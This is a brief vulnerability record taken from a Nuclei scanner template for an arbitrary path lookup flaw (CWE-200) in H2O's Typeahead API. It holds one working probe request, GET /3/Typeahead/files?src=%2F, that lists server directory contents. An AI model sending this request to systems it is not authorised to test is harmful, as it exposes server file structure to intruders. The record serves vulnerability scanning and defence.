# Vulnerability: H2O - Arbitrary Path Lookup
**Classification:** CWE-200
**Source:** Nuclei Template (`h2o-arbitary-file-read.yaml`)

## Description
H2O allows for arbitrary path lookup via it's Typehead API endpoint

## Vulnerable Code Pattern / Exploit Payload
```http
GET /3/Typeahead/files?src=%2F&limit=10 HTTP/1.1
Host: {{Hostname}}
```

